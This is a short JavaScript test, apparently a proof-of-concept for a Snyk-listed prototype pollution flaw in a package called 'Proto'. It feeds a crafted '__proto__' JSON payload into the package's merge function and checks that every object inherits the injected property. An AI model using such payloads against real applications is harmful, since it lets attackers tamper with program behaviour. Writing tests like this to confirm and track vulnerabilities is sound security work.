//https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301
test("prototype pollution in Proto", () => {
  const proto = require("Proto");
  let payload = '{"__proto__":{"polluted":"yes"}}';

  expect({}.polluted).toBe(undefined);

  proto.merge({}, JSON.parse(payload));

  expect({}.polluted).toBe("yes");
});
